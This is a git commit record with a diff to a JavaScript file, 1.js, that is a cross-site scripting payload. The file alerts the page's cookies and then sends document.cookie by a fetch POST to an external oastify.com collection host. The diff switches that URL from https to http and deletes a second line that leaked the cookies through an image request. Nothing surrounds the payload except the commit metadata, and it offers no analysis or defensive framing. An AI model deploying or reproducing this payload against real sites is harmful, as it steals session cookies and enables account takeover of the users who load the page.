61f4389b28af9bba00ac59ebdca407f128f55f6e
Tejas378 <64826070+Tejas378@users.noreply.github.com>
2024-02-24 15:55:45 +0530

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,8 +1,6 @@
 alert(document.cookie);
-fetch('https://2dgfdz4429estq5vpti4bz1modubi0.oastify.com/', {
+fetch('http://2dgfdz4429estq5vpti4bz1modubi0.oastify.com/', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
-var i=new Image;
-i.src="2dgfdz4429estq5vpti4bz1modubi0.oastify.com/?"+document.cookie;
